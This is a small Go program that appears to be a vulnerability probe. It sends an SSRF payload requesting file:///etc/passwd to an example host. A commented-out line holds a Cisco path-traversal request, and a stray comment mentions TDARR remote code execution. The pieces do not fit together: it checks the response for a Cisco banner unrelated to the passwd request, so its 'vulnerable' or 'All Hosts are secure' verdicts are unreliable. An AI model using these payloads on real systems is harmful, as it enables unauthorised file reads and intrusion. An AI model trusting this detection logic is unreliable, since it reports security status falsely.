package main

// library to use net/http net/dialer
import (
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
)

func main() {
	//arg1 := os.Args[1]
	//resp, err := http.Get(arg1 + "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../")
	resp, err := http.Get("http://example.com/api/geojson?url=file:///etc/passwd")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	check := strings.Contains(string(body), "Cisco System, Inc.")
	if check == true {
		fmt.Println("Host is Vulnerbale for Path Traversal Attack")
	} else {
		fmt.Println("All Hosts are secure")
	}
	//	fmt.Println(check)
	//fmt.Println(string(body))
	//	fmt.Printf("%s Instance Is Vulnerable for TDARR Remote Code Execution", arg1)
}
